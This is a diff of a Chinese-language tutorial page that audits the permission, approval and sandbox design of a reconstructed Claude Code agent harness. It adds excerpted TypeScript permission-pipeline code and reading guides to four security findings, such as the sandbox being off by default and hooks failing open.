@@ -1,1 +1,533 @@
-<!doctype html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="description" content="问用户、限制能力和隔离执行分别解决什么问题？"><title>Claude Code（复原） · M07 · 安全：审批、权限和边界</title><link rel="stylesheet" href="../../../../assets/harness.css"></head><body><div class="reading-progress" id="reading-progress"></div><header class="site-top"><button class="menu-button" data-menu>☰</button><a class="brand" href="../../../../zh/index.html">AWESOME <em>HARNESS</em></a><span class="crumb">Claude Code（复原） · 中文</span><nav><a href="../../../../zh/index.html">总览</a><a href="../analysis.html">技术分析</a><a href="index.html">小白教程</a><a href="ch07-security.html">中</a><a href="../../en/tutorial/ch07-security.html">EN</a></nav></header><div class="layout"><aside class="side-nav" data-side><div class="side-project"><strong>Claude Code（复原）</strong><small>Legacy source-backed harness audit</small></div><a class="" href="../analysis.html">技术分析单页</a><div class="side-label">章节课程</div><a class="" href="ch01-overview.html"><span>M01</span>总览：先知道它解决什么问题</a><a class="" href="ch02-architecture.html"><span>M02</span>架构：有哪些层，谁负责什么</a><a class="" href="ch03-loop.html"><span>M03</span>主循环：任务为什么会继续推进</a><a class="" href="ch04-model.html"><span>M04</span>模型与消息：流式结果如何进入状态</a><a class="" href="ch05-tools.html"><span>M05</span>工具：Agent 的手脚怎样被注册</a><a class="" href="ch06-context.html"><span>M06</span>上下文：长任务怎样不丢重点</a><a class="active" href="ch07-security.html"><span>M07</span>安全：审批、权限和边界</a><a class="" href="ch08-ecosystem.html"><span>M08</span>扩展：MCP、Skill、插件如何接入</a><a class="" href="ch09-collaboration.html"><span>M09</span>协作：子 Agent 与工作流</a><a class="" href="ch10-evidence.html"><span>M10</span>证据与取舍：把源码结论带回自研</a><div class="side-foot">main<br>3bb6b5746238</div></aside><main><section class="chapter-hero"><p class="eyebrow">M07 · Claude Code（复原） · 3bb6b5746238</p><h1>安全：审批、权限和边界</h1><p class="lede">问用户、限制能力和隔离执行分别解决什么问题？</p><div class="chapter-meta"><span>第 7 / 10 章</span><span>4 条源码 finding</span><span>main</span></div></section><section class="prose video-panel compact"><div class="section-head"><span>视频与字幕</span><h2>把这次源码阅读做成可复习的短视频</h2></div><p>视频只承诺页面和源码中能证明的事实；脚本、画面、SRT 与成片会在同一个视频目录中按版本留痕。</p><div class="video-list"><article class="video-item"><div><span>M07</span><b>Claude Code（复原） · M07 · 安全：审批、权限和边界</b></div><div class="video-links"><a href="../../../../videos/claude-code/ch07-security.mp4" data-video-status="published">MP4</a><a href="../../../../videos/claude-code/ch07-security.srt" data-video-status="published">SRT</a><em>3bb6b5746238</em></div></article></div></section><section class="lesson prose"><div class="lesson-route"><span>本章路线</span><b>问题</b><i>→</i><b>比喻</b><i>→</i><b>多条源码证据</b><i>→</i><b>交互图</b><i>→</i><b>练习</b></div><div class="callout"><b>先用一个生活比喻</b><p>审批像门卫问预约，权限像门禁卡，沙箱像指定房间；它们不是同一件事。</p></div><h2>先回答本章问题</h2><p>问用户、限制能力和隔离执行分别解决什么问题？ 它像依据成品拆机后复原出的工程图，能研究结构，但不能把每一处细节当成原厂图纸。</p><h2>本章证据板：4 条 finding</h2><p>不要把一段代码当成整个系统；下面每张卡分别说明事实、白话、工程影响、边界和可点击的固定源码。</p><div class="finding-stack"><article class="finding-card compact" id="claude-code-permission-001" data-finding-dimension="security"><header><span class="finding-index">01</span><div><div class="finding-meta"><b>L1</b><span>fact</span><span>security</span></div><h3>01 · 权限是“规则 → 工具自检 → 安全检查 → 模式 → 用户/自动判定”的有序流水线</h3></div></header><div class="finding-grid"><div class="finding-copy"><section><span>源码事实</span><p>显式 deny、ask、工具自己的内容级检查和敏感路径 safetyCheck 先执行；之后 bypass/always-allow 才可能放行，passthrough 最终转为 ask。dontAsk 把 ask 变 deny，auto 可进入分类器。</p></section><section><span>白话解释</span><p>不是一个总开关，而是多道门；即使开了 bypass，显式 ask 和某些安全路径仍能拦住。</p></section><section class="finding-impact"><span>对自研 Harness 的含义</span><p>规则优先级清晰，适合企业策略；复杂度也意味着每种工具必须准确返回 decisionReason。</p></section><small class="finding-source-note">叙述来自历史证据账本 · 53f347d34666 · <a href="https://github.com/claude-code-best/claude-code/blob/53f347d34666e847405714095020afdfadb95503/src/utils/permissions/permissions.ts#L1179-L1281" target="_blank" rel="noreferrer">打开账本提交 ↗</a></small></div><div class="finding-code"><div class="finding-code-head"><span>src/utils/permissions/permissions.ts:1179–1281</span><a href="https://github.com/claude-code-best/claude-code/blob/53f347d34666e847405714095020afdfadb95503/src/utils/permissions/permissions.ts#L1179-L1281" target="_blank" rel="noreferrer">固定提交 ↗</a></div><pre><code>deny/ask/tool check/safetyCheck 顺序。</code></pre></div></div></article><article class="finding-card compact" id="claude-code-permission-002" data-finding-dimension="security"><header><span class="finding-index">02</span><div><div class="finding-meta"><b>L1</b><span>fact</span><span>security</span></div><h3>02 · 无头与后台 Agent 默认不能弹窗，先给 hook/分类器机会再 fail closed</h3></div></header><div class="finding-grid"><div class="finding-copy"><section><span>源码事实</span><p>无头权限请求会执行 PermissionRequest hooks；hook 无决定时回到自动拒绝。后台 bubble/coordinator worker 可先等待自动检查，swarm worker 还能把请求转给 leader，主线程才展示交互对话框。</p></section><section><span>白话解释</span><p>没人盯屏幕时不会卡在“请点允许”；可以让自动政策先裁决，裁决不了再拒绝或向上冒泡。</p></section><section class="finding-impact"><span>对自研 Harness 的含义</span><p>协作 Agent 的权限不是复制主线程 UI，而是独立的异步授权协议。</p></section><small class="finding-source-note">叙述来自历史证据账本 · 53f347d34666 · <a href="https://github.com/claude-code-best/claude-code/blob/53f347d34666e847405714095020afdfadb95503/src/utils/permissions/permissions.ts#L392-L470" target="_blank" rel="noreferrer">打开账本提交 ↗</a></small><small class="finding-source-note">当前刷新提交对照 · <a href="https://github.com/claude-code-best/claude-code/blob/3bb6b5746238c418138eb96d57765d79012edd96/src/utils/permissions/permissions.ts#L1179-L1281" target="_blank" rel="noreferrer">src/utils/permissions/permissions.ts:1179–1281 ↗</a></small></div><div class="finding-code"><div class="finding-code-head"><span>src/utils/permissions/permissions.ts:392–470</span><a href="https://github.com/claude-code-best/claude-code/blob/53f347d34666e847405714095020afdfadb95503/src/utils/permissions/permissions.ts#L392-L470" target="_blank" rel="noreferrer">固定提交 ↗</a></div><pre><code>无头 PermissionRequest hook 与失败回退。</code></pre></div></div></article><article class="finding-card compact" id="claude-code-sandbox-001" data-finding-dimension="security"><header><span class="finding-index">03</span><div><div class="finding-meta"><b>L1</b><span>limitation</span><span>security</span></div><h3>03 · 有真实 OS sandbox 适配，但默认关闭且默认允许退回非沙箱命令</h3></div></header><div class="finding-grid"><div class="finding-copy"><section><span>源码事实</span><p>适配层调用外部 @anthropic-ai/sandbox-runtime；sandbox.enabled 默认 false，allowUnsandboxedCommands 默认 true，只有 enabled+failIfUnavailable 才要求启动失败即失败。平台/依赖不满足时 isSandboxingEnabled 返回 false。</p></section><section><span>白话解释</span><p>确实能装防护罩，但开箱时罩子没扣上，而且政策默认允许个别命令绕开它。</p></section><section class="finding-impact"><span>对自研 Harness 的含义</span><p>可评为“具备可选强隔离能力”，不能评为“默认安全沙箱”；底层 seatbelt/bubblewrap 细节还依赖仓库外的包。</p></section><small class="finding-source-note">叙述来自历史证据账本 · 53f347d34666 · <a href="https://github.com/claude-code-best/claude-code/blob/53f347d34666e847405714095020afdfadb95503/src/utils/sandbox/sandbox-adapter.ts#L1-L22" target="_blank" rel="noreferrer">打开账本提交 ↗</a></small><small class="finding-source-note">当前刷新提交对照 · <a href="https://github.com/claude-code-best/claude-code/blob/3bb6b5746238c418138eb96d57765d79012edd96/src/utils/permissions/permissions.ts#L1179-L1281" target="_blank" rel="noreferrer">src/utils/permissions/permissions.ts:1179–1281 ↗</a></small></div><div class="finding-code"><div class="finding-code-head"><span>src/utils/sandbox/sandbox-adapter.ts:1–22</span><a href="https://github.com/claude-code-best/claude-code/blob/53f347d34666e847405714095020afdfadb95503/src/utils/sandbox/sandbox-adapter.ts#L1-L22" target="_blank" rel="noreferrer">固定提交 ↗</a></div><pre><code>外部 sandbox-runtime bridge。</code></pre></div></div></article><article class="finding-card compact" id="claude-code-sandbox-002" data-finding-dimension="security"><header><span class="finding-index">04</span><div><div class="finding-meta"><b>L1</b><span>risk</span><span>security</span></div><h3>04 · hook 只做网络沙箱，包装失败时会继续无沙箱执行</h3></div></header><div class="finding-grid"><div class="finding-copy"><section><span>源码事实</span><p>shell hook 在 sandbox 开启时配置 deny-all outbound，但给予全文件系统写权限；wrap 失败会记录 warning 并运行原命令。Bash 的 excludedCommands 也被源码明确标注为便利功能而非安全边界。</p></section><section><span>白话解释</span><p>hook 能被断网，但仍可改本机文件；连断网罩都戴不上时，为兼容旧行为会直接执行。</p></section><section class="finding-impact"><span>对自研 Harness 的含义</span><p>企业场景应把 hook fail-open 改为策略可控的 fail-closed，并把项目 hook 来源信任与动作权限分开。</p></section><small class="finding-source-note">叙述来自历史证据账本 · 53f347d34666 · <a href="https://github.com/claude-code-best/claude-code/blob/53f347d34666e847405714095020afdfadb95503/src/utils/hooks.ts#L1041-L1088" target="_blank" rel="noreferrer">打开账本提交 ↗</a></small><small class="finding-source-note">当前刷新提交对照 · <a href="https://github.com/claude-code-best/claude-code/blob/3bb6b5746238c418138eb96d57765d79012edd96/src/utils/permissions/permissions.ts#L1179-L1281" target="_blank" rel="noreferrer">src/utils/permissions/permissions.ts:1179–1281 ↗</a></small></div><div class="finding-code"><div class="finding-code-head"><span>src/utils/hooks.ts:1041–1088</span><a href="https://github.com/claude-code-best/claude-code/blob/53f347d34666e847405714095020afdfadb95503/src/utils/hooks.ts#L1041-L1088" target="_blank" rel="noreferrer">固定提交 ↗</a></div><pre><code>hook network-only sandbox 与失败后无沙箱执行。</code></pre></div></div></article></div><h2>把证据放回全链路</h2><div class="flow-strip"><span>输入 / 事件</span><i>→</i><span>规则 / 状态</span><i>→</i><span>模型 / 工具</span><i>→</i><span>回执 / 持久化</span><i>→</i><span>恢复 / 下一步</span></div><iframe class="diagram-frame diagram-frame-rich" src="../diagrams/architecture.html" title="Claude Code（复原） architecture" loading="lazy"></iframe><h2>小白练习：不要只会复述</h2><div class="exercise"><p>把本章 finding 卡片遮住白话解释，只看源码：谁创建状态？谁能改变状态？副作用在哪里发生？失败时写入了什么回执？最后点开行号链接，确认你的回答没有超出固定提交。</p><details><summary>查看提示</summary><ul><li>先找输入和状态，不要先找函数名。</li><li>把 policy / approval / sandbox 分开写。</li><li>如果引用来自历史账本，记得查看卡片里的历史 commit 标识。</li></ul></details></div></section><footer class="chapter-footer"><a href="ch06-context.html">← 上下文：长任务怎样不丢重点</a><a href="ch08-ecosystem.html">扩展：MCP、Skill、插件如何接入 →</a></footer></main></div><script src="../../../../assets/harness.js"></script></body></html>
+<!doctype html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="description" content="问用户、限制能力和隔离执行分别解决什么问题？"><title>Claude Code（复原） · M07 · 安全：审批、权限和边界</title><link rel="stylesheet" href="../../../../assets/harness.css"></head><body><div class="reading-progress" id="reading-progress"></div><header class="site-top"><button class="menu-button" data-menu>☰</button><a class="brand" href="../../../../zh/index.html">AWESOME <em>HARNESS</em></a><span class="crumb">Claude Code（复原） · 中文</span><nav><a href="../../../../zh/index.html">总览</a><a href="../analysis.html">技术分析</a><a href="index.html">小白教程</a><a href="ch07-security.html">中</a><a href="../../en/tutorial/ch07-security.html">EN</a></nav></header><div class="layout"><aside class="side-nav" data-side><div class="side-project"><strong>Claude Code（复原）</strong><small>Legacy source-backed harness audit</small></div><a class="" href="../analysis.html">技术分析单页</a><div class="side-label">章节课程</div><a class="" href="ch01-overview.html"><span>M01</span>总览：先知道它解决什么问题</a><a class="" href="ch02-architecture.html"><span>M02</span>架构：有哪些层，谁负责什么</a><a class="" href="ch03-loop.html"><span>M03</span>主循环：任务为什么会继续推进</a><a class="" href="ch04-model.html"><span>M04</span>模型与消息：流式结果如何进入状态</a><a class="" href="ch05-tools.html"><span>M05</span>工具：Agent 的手脚怎样被注册</a><a class="" href="ch06-context.html"><span>M06</span>上下文：长任务怎样不丢重点</a><a class="active" href="ch07-security.html"><span>M07</span>安全：审批、权限和边界</a><a class="" href="ch08-ecosystem.html"><span>M08</span>扩展：MCP、Skill、插件如何接入</a><a class="" href="ch09-collaboration.html"><span>M09</span>协作：子 Agent 与工作流</a><a class="" href="ch10-evidence.html"><span>M10</span>证据与取舍：把源码结论带回自研</a><div class="side-foot">main<br>3bb6b5746238</div></aside><main><section class="chapter-hero"><p class="eyebrow">M07 · Claude Code（复原） · 3bb6b5746238</p><h1>安全：审批、权限和边界</h1><p class="lede">问用户、限制能力和隔离执行分别解决什么问题？</p><div class="chapter-meta"><span>第 7 / 10 章</span><span>4 条源码 finding</span><span>main</span></div></section><section class="prose video-panel compact"><div class="section-head"><span>视频与字幕</span><h2>把这次源码阅读做成可复习的短视频</h2></div><p>视频只承诺页面和源码中能证明的事实；脚本、画面、SRT 与成片会在同一个视频目录中按版本留痕。</p><div class="video-list"><article class="video-item"><div><span>M07</span><b>Claude Code（复原） · M07 · 安全：审批、权限和边界</b></div><div class="video-links"><a href="../../../../videos/claude-code/ch07-security.mp4" data-video-status="published">MP4</a><a href="../../../../videos/claude-code/ch07-security.srt" data-video-status="published">SRT</a><em>3bb6b5746238</em></div></article></div></section><section class="lesson prose"><div class="lesson-route"><span>本章路线</span><b>问题</b><i>→</i><b>比喻</b><i>→</i><b>多条源码证据</b><i>→</i><b>四问</b><i>→</i><b>交互图</b><i>→</i><b>练习</b></div><div class="callout"><b>先用一个生活比喻</b><p>审批像门卫问预约，权限像门禁卡，沙箱像指定房间；它们不是同一件事。</p></div><h2>先回答本章问题</h2><p>问用户、限制能力和隔离执行分别解决什么问题？ 它像依据成品拆机后复原出的工程图，能研究结构，但不能把每一处细节当成原厂图纸。</p><h2>本章证据板：4 条 finding</h2><p>不要把一段代码当成整个系统；下面每张卡分别说明事实、白话、工程影响、边界和可点击的固定源码。</p><div class="finding-stack"><article class="finding-card compact" id="claude-code-permission-001" data-finding-dimension="security"><header><span class="finding-index">01</span><div><div class="finding-meta"><b>L1</b><span>fact</span><span>security</span></div><h3>01 · 权限是“规则 → 工具自检 → 安全检查 → 模式 → 用户/自动判定”的有序流水线</h3></div></header><div class="finding-grid"><div class="finding-copy"><section><span>源码事实</span><p>显式 deny、ask、工具自己的内容级检查和敏感路径 safetyCheck 先执行；之后 bypass/always-allow 才可能放行，passthrough 最终转为 ask。dontAsk 把 ask 变 deny，auto 可进入分类器。</p></section><section><span>白话解释</span><p>不是一个总开关，而是多道门；即使开了 bypass，显式 ask 和某些安全路径仍能拦住。</p></section><section class="finding-impact"><span>对自研 Harness 的含义</span><p>规则优先级清晰，适合企业策略；复杂度也意味着每种工具必须准确返回 decisionReason。</p></section><div class="line-guide"><span>逐段阅读提示</span><ol><li><code>1179–1229</code><div><b>入口、配置和状态初始化</b><p>先确认谁拿到输入、读取了哪些配置、创建了哪些状态。</p></div></li><li><code>1230–1281</code><div><b>分支、副作用和回执</b><p>再追踪条件分支、外部调用、事件写入和失败出口；不要只看函数名。</p></div></li><li><code>after</code><div><b>回到调用者</b><p>最后沿着调用者和下一条事件继续读，确认这段代码的结果如何被消费。</p></div></li></ol></div><small class="finding-source-note">叙述来自历史证据账本 · 53f347d34666 · <a href="https://github.com/claude-code-best/claude-code/blob/53f347d34666e847405714095020afdfadb95503/src/utils/permissions/permissions.ts#L1179-L1281" target="_blank" rel="noreferrer">打开账本提交 ↗</a></small></div><div class="finding-code"><div class="finding-code-head"><span>src/utils/permissions/permissions.ts:1179–1281</span><a href="https://github.com/claude-code-best/claude-code/blob/53f347d34666e847405714095020afdfadb95503/src/utils/permissions/permissions.ts#L1179-L1281" target="_blank" rel="noreferrer">固定提交 ↗</a></div><pre><code> 1179  async function hasPermissionsToUseToolInner(
+ 1180    tool: Tool,
+ 1181    input: { [key: string]: unknown },
+ 1182    context: ToolUseContext,
+ 1183  ): Promise&lt;PermissionDecision&gt; {
+ 1184    if (context.abortController.signal.aborted) {
+ 1185      throw new AbortError()
+ 1186    }
+ 1187
+ 1188    let appState = context.getAppState()
+ 1189
+ 1190    // 1. Check if the tool is denied
+ 1191    // 1a. Entire tool is denied
+ 1192    const denyRule = getDenyRuleForTool(appState.toolPermissionContext, tool)
+ 1193    if (denyRule) {
+ 1194      return {
+ 1195        behavior: &#39;deny&#39;,
+ 1196        decisionReason: {
+ 1197          type: &#39;rule&#39;,
+ 1198          rule: denyRule,
+ 1199        },
+ 1200        message: `Permission to use ${tool.name} has been denied.`,
+ 1201      }
+ 1202    }
+ 1203
+ 1204    // 1b. Check if the entire tool should always ask for permission
+ 1205    const askRule = getAskRuleForTool(appState.toolPermissionContext, tool)
+ 1206    if (askRule) {
+ 1207      // When autoAllowBashIfSandboxed is on, sandboxed commands skip the ask rule and
+ 1208      // auto-allow via Bash&#39;s checkPermissions. Commands that won&#39;t be sandboxed (excluded
+ 1209      // commands, dangerouslyDisableSandbox) still need to respect the ask rule.
+ 1210      const canSandboxAutoAllow =
+ 1211        tool.name === BASH_TOOL_NAME &amp;&amp;
+ 1212        SandboxManager.isSandboxingEnabled() &amp;&amp;
+ 1213        SandboxManager.isAutoAllowBashIfSandboxedEnabled() &amp;&amp;
+ 1214        shouldUseSandbox(input)
+ 1215
+ 1216      if (!canSandboxAutoAllow) {
+ 1217        return {
+ 1218          behavior: &#39;ask&#39;,
+ 1219          decisionReason: {
+ 1220            type: &#39;rule&#39;,
+ 1221            rule: askRule,
+ 1222          },
+ 1223          message: createPermissionRequestMessage(tool.name),
+ 1224        }
+ 1225      }
+ 1226      // Fall through to let Bash&#39;s checkPermissions handle command-specific rules
+ 1227    }
+ 1228
+ 1229    // 1c. Ask the tool implementation for a permission result
+ 1230    // Overridden unless tool input schema is not valid
+ 1231    let toolPermissionResult: PermissionResult = {
+ 1232      behavior: &#39;passthrough&#39;,
+ 1233      message: createPermissionRequestMessage(tool.name),
+ 1234    }
+ 1235    try {
+ 1236      const parsedInput = tool.inputSchema.parse(input)
+ 1237      toolPermissionResult = await tool.checkPermissions(parsedInput, context)
+ 1238    } catch (e) {
+ 1239      // Rethrow abort errors so they propagate properly
+ 1240      if (e instanceof AbortError || e instanceof APIUserAbortError) {
+ 1241        throw e
+ 1242      }
+ 1243      logError(e)
+ 1244    }
+ 1245
+ 1246    // 1d. Tool implementation denied permission
+ 1247    if (toolPermissionResult?.behavior === &#39;deny&#39;) {
+ 1248      return toolPermissionResult
+ 1249    }
+ 1250
+ 1251    // 1e. Tool requires user interaction even in bypass mode
+ 1252    if (
+ 1253      tool.requiresUserInteraction?.() &amp;&amp;
+ 1254      toolPermissionResult?.behavior === &#39;ask&#39;
+ 1255    ) {
+ 1256      return toolPermissionResult
+ 1257    }
+ 1258
+ 1259    // 1f. Content-specific ask rules from tool.checkPermissions take precedence
+ 1260    // over bypassPermissions mode. When a user explicitly configures a
+ 1261    // content-specific ask rule (e.g. Bash(npm publish:*)), the tool&#39;s
+ 1262    // checkPermissions returns {behavior:&#39;ask&#39;, decisionReason:{type:&#39;rule&#39;,
+ 1263    // rule:{ruleBehavior:&#39;ask&#39;}}}. This must be respected even in bypass mode,
+ 1264    // just as deny rules are respected at step 1d.
+ 1265    if (
+ 1266      toolPermissionResult?.behavior === &#39;ask&#39; &amp;&amp;
+ 1267      toolPermissionResult.decisionReason?.type === &#39;rule&#39; &amp;&amp;
+ 1268      toolPermissionResult.decisionReason.rule.ruleBehavior === &#39;ask&#39;
+ 1269    ) {
+ 1270      return toolPermissionResult
+ 1271    }
+ 1272
+ 1273    // 1g. Safety checks (e.g. .git/, .claude/, .vscode/, shell configs) are
+ 1274    // bypass-immune — they must prompt even in bypassPermissions mode.
+ 1275    // checkPathSafetyForAutoEdit returns {type:&#39;safetyCheck&#39;} for these paths.
+ 1276    if (
+ 1277      toolPermissionResult?.behavior === &#39;ask&#39; &amp;&amp;
+ 1278      toolPermissionResult.decisionReason?.type === &#39;safetyCheck&#39;
+ 1279    ) {
+ 1280      return toolPermissionResult
+ 1281    }
+ 1282
+ 1283    // 2a. Check if mode allows the tool to run
+ 1284    // IMPORTANT: Call getAppState() to get the latest value
+ 1285    appState = context.getAppState()
+ 1286    // Check if permissions should be bypassed:
+ 1287    // - Direct bypassPermissions mode
+ 1288    // - Plan mode when the user originally started with bypass mode (isBypassPermissionsModeAvailable)
+ 1289    const shouldBypassPermissions =
+ 1290      appState.toolPermissionContext.mode === &#39;bypassPermissions&#39; ||
+ 1291      (appState.toolPermissionContext.mode === &#39;plan&#39; &amp;&amp;
+ 1292        appState.toolPermissionContext.isBypassPermissionsModeAvailable)
+ 1293    if (shouldBypassPermissions) {
+ 1294      return {
+ 1295        behavior: &#39;allow&#39;,
+ 1296        updatedInput: getUpdatedInputOrFallback(toolPermissionResult, input),
+ 1297        decisionReason: {
+ 1298          type: &#39;mode&#39;,
+ 1299          mode: appState.toolPermissionContext.mode,
+ 1300        },
+ 1301      }
+ 1302    }
+ 1303
+ 1304    // 2b. Entire tool is allowed
+ 1305    const alwaysAllowedRule = toolAlwaysAllowedRule(
+ 1306      appState.toolPermissionContext,
+ 1307      tool,
+ 1308    )
+ 1309    if (alwaysAllowedRule) {
+ 1310      return {
+ 1311        behavior: &#39;allow&#39;,
+ 1312        updatedInput: getUpdatedInputOrFallback(toolPermissionResult, input),
+ 1313        decisionReason: {
+ 1314          type: &#39;rule&#39;,
+ 1315          rule: alwaysAllowedRule,
+ 1316        },
+ 1317      }
+ 1318    }
+ 1319
+ 1320    // 3. Convert &quot;passthrough&quot; to &quot;ask&quot;
+ 1321    const result: PermissionDecision =
+ 1322      toolPermissionResult.behavior === &#39;passthrough&#39;
+ 1323        ? {
+ 1324            ...toolPermissionResult,
+ 1325            behavior: &#39;ask&#39; as const,
+ 1326            message: createPermissionRequestMessage(
+ 1327              tool.name,
+ 1328              toolPermissionResult.decisionReason,
+ 1329            ),
+ 1330          }
+ 1331        : toolPermissionResult
+ 1332
+ 1333    if (result.behavior === &#39;ask&#39; &amp;&amp; result.suggestions) {
+ 1334      logForDebugging(
+ 1335        `Permission suggestions for ${tool.name}: ${jsonStringify(result.suggestions, null, 2)}`,
+ 1336      )
+ 1337    }
+ 1338
+ 1339    return result
+ 1340  }
+ 1341
+ 1342  type EditPermissionRuleArgs = {
+ 1343    initialContext: ToolPermissionContext
+ 1344    setToolPermissionContext: (updatedContext: ToolPermissionContext) =&gt; void
+ 1345  }
+ 1346
+ 1347  /**
+ 1348   * Delete a permission rule from the appropriate destination
+ 1349   */
+ 1350  export async function deletePermissionRule({
+ 1351    rule,
+ 1352    initialContext,</code></pre></div></div></article><article class="finding-card compact" id="claude-code-permission-002" data-finding-dimension="security"><header><span class="finding-index">02</span><div><div class="finding-meta"><b>L1</b><span>fact</span><span>security</span></div><h3>02 · 无头与后台 Agent 默认不能弹窗，先给 hook/分类器机会再 fail closed</h3></div></header><div class="finding-grid"><div class="finding-copy"><section><span>源码事实</span><p>无头权限请求会执行 PermissionRequest hooks；hook 无决定时回到自动拒绝。后台 bubble/coordinator worker 可先等待自动检查，swarm worker 还能把请求转给 leader，主线程才展示交互对话框。</p></section><section><span>白话解释</span><p>没人盯屏幕时不会卡在“请点允许”；可以让自动政策先裁决，裁决不了再拒绝或向上冒泡。</p></section><section class="finding-impact"><span>对自研 Harness 的含义</span><p>协作 Agent 的权限不是复制主线程 UI，而是独立的异步授权协议。</p></section><div class="line-guide"><span>逐段阅读提示</span><ol><li><code>392–430</code><div><b>入口、配置和状态初始化</b><p>先确认谁拿到输入、读取了哪些配置、创建了哪些状态。</p></div></li><li><code>431–470</code><div><b>分支、副作用和回执</b><p>再追踪条件分支、外部调用、事件写入和失败出口；不要只看函数名。</p></div></li><li><code>after</code><div><b>回到调用者</b><p>最后沿着调用者和下一条事件继续读，确认这段代码的结果如何被消费。</p></div></li></ol></div><small class="finding-source-note">叙述来自历史证据账本 · 53f347d34666 · <a href="https://github.com/claude-code-best/claude-code/blob/53f347d34666e847405714095020afdfadb95503/src/utils/permissions/permissions.ts#L392-L470" target="_blank" rel="noreferrer">打开账本提交 ↗</a></small></div><div class="finding-code"><div class="finding-code-head"><span>src/utils/permissions/permissions.ts:392–470</span><a href="https://github.com/claude-code-best/claude-code/blob/53f347d34666e847405714095020afdfadb95503/src/utils/permissions/permissions.ts#L392-L470" target="_blank" rel="noreferrer">固定提交 ↗</a></div><pre><code>  392  /**
+  393   * Runs PermissionRequest hooks for headless/async agents that cannot show
+  394   * permission prompts. This gives hooks an opportunity to allow or deny
+  395   * tool use before the fallback auto-deny kicks in.
+  396   *
+  397   * Returns a PermissionDecision if a hook made a decision, or null if no
+  398   * hook provided a decision (caller should proceed to auto-deny).
+  399   */
+  400  async function runPermissionRequestHooksForHeadlessAgent(
+  401    tool: Tool,
+  402    input: { [key: string]: unknown },
+  403    toolUseID: string,
+  404    context: ToolUseContext,
+  405    permissionMode: string | undefined,
+  406    suggestions: PermissionUpdate[] | undefined,
+  407  ): Promise&lt;PermissionDecision | null&gt; {
+  408    try {
+  409      for await (const hookResult of executePermissionRequestHooks(
+  410        tool.name,
+  411        toolUseID,
+  412        input,
+  413        context,
+  414        permissionMode,
+  415        suggestions as any,
+  416        context.abortController.signal,
+  417      )) {
+  418        if (!hookResult.permissionRequestResult) {
+  419          continue
+  420        }
+  421        const decision = hookResult.permissionRequestResult
+  422        if (decision.behavior === &#39;allow&#39;) {
+  423          const finalInput = decision.updatedInput ?? input
+  424          // Persist permission updates if provided
+  425          if (decision.updatedPermissions?.length) {
+  426            persistPermissionUpdates(decision.updatedPermissions as any)
+  427            context.setAppState(prev =&gt; ({
+  428              ...prev,
+  429              toolPermissionContext: applyPermissionUpdates(
+  430                prev.toolPermissionContext,
+  431                decision.updatedPermissions as any,
+  432              ),
+  433            }))
+  434          }
+  435          return {
+  436            behavior: &#39;allow&#39;,
+  437            updatedInput: finalInput,
+  438            decisionReason: {
+  439              type: &#39;hook&#39;,
+  440              hookName: &#39;PermissionRequest&#39;,
+  441            },
+  442          }
+  443        }
+  444        if (decision.behavior === &#39;deny&#39;) {
+  445          if (decision.interrupt) {
+  446            logForDebugging(
+  447              `Hook interrupt: tool=${tool.name} hookMessage=${decision.message}`,
+  448            )
+  449            context.abortController.abort()
+  450          }
+  451          return {
+  452            behavior: &#39;deny&#39;,
+  453            message: decision.message || &#39;Permission denied by hook&#39;,
+  454            decisionReason: {
+  455              type: &#39;hook&#39;,
+  456              hookName: &#39;PermissionRequest&#39;,
+  457              reason: decision.message,
+  458            },
+  459          }
+  460        }
+  461      }
+  462    } catch (error) {
+  463      // If hooks fail, fall through to auto-deny rather than crashing
+  464      logError(
+  465        new Error(&#39;PermissionRequest hook failed for headless agent&#39;, {
+  466          cause: toError(error),
+  467        }),
+  468      )
+  469    }
+  470    return null
+  471  }
+  472
+  473  export const hasPermissionsToUseTool: CanUseToolFn = async (
+  474    tool,
+  475    input,
+  476    context,
+  477    assistantMessage,
+  478    toolUseID,
+  479  ): Promise&lt;PermissionDecision&gt; =&gt; {
+  480    const result = await hasPermissionsToUseToolInner(tool, input, context)
+  481
+  482    // Reset consecutive denials on any allowed tool use in auto mode.
+  483    // This ensures that a successful tool use (even one auto-allowed by rules)
+  484    // breaks the consecutive denial streak.
+  485    if (result.behavior === &#39;allow&#39;) {
+  486      const appState = context.getAppState()
+  487      if (feature(&#39;TRANSCRIPT_CLASSIFIER&#39;)) {
+  488        const currentDenialState =
+  489          context.localDenialTracking ?? appState.denialTracking
+  490        if (
+  491          appState.toolPermissionContext.mode === &#39;auto&#39; &amp;&amp;
+  492          currentDenialState &amp;&amp;
+  493          currentDenialState.consecutiveDenials &gt; 0
+  494        ) {
+  495          const newDenialState = recordSuccess(currentDenialState)
+  496          persistDenialState(context, newDenialState)
+  497        }
+  498      }
+  499      return result
+  500    }
+  501
+  502    // Apply dontAsk mode transformation: convert &#39;ask&#39; to &#39;deny&#39;
+  503    // This is done at the end so it can&#39;t be bypassed by early returns
+  504    if (result.behavior === &#39;ask&#39;) {
+  505      const appState = context.getAppState()
+  506
+  507      if (appState.toolPermissionContext.mode === &#39;dontAsk&#39;) {
+  508        return {
+  509          behavior: &#39;deny&#39;,
+  510          decisionReason: {
+  511            type: &#39;mode&#39;,
+  512            mode: &#39;dontAsk&#39;,
+  513          },
+  514          message: DONT_ASK_REJECT_MESSAGE(tool.name),
+  515        }
+  516      }
+  517      // Apply auto mode: use AI classifier instead of prompting user
+  518      // Check this BEFORE shouldAvoidPermissionPrompts so classifiers work in headless mode
+  519      if (
+  520        feature(&#39;TRANSCRIPT_CLASSIFIER&#39;) &amp;&amp;
+  521        (appState.toolPermissionContext.mode === &#39;auto&#39; ||
+  522          (appState.toolPermissionContext.mode === &#39;plan&#39; &amp;&amp;
+  523            (autoModeStateModule?.isAutoModeActive() ?? false)))
+  524      ) {
+  525        // Non-classifier-approvable safetyCheck decisions stay immune to ALL
+  526        // auto-approve paths: the acceptEdits fast-path, the safe-tool allowlist,
+  527        // and the classifier. Step 1g only guards bypassPermissions; this guards
+  528        // auto. classifierApprovable safetyChecks (sensitive-file paths) fall
+  529        // through to the classifier — the fast-paths below naturally don&#39;t fire
+  530        // because the tool&#39;s own checkPermissions still returns &#39;ask&#39;.
+  531        if (
+  532          result.decisionReason?.type === &#39;safetyCheck&#39; &amp;&amp;
+  533          !result.decisionReason.classifierApprovable
+  534        ) {
+  535          if (appState.toolPermissionContext.shouldAvoidPermissionPrompts) {
+  536            return {
+  537              behavior: &#39;deny&#39;,
+  538              message: result.message,
+  539              decisionReason: {
